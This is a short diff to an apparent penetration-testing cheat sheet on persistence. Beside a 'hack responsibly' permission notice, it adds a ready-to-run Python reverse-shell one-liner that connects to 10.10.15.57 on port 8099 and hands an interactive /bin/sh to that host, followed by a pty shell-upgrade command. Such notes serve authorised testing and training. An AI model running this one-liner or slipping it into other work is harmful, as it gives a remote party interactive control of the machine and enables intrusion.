@@ -1,4 +1,4 @@
-# Persistance
+# Persistence
 
 {% hint style="success" %}
 Hack Responsibly.
@@ -6,7 +6,15 @@ Hack Responsibly.
 Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
 {% endhint %}
 
-## Remote shells
+## Reverse Shells
+
+### Python Reverse Shell
+
+```bash
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.57",8099));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+## Upgrading remote shells
 
 ```bash
 python -c 'import pty;pty.spawn("/bin/bash")'; 
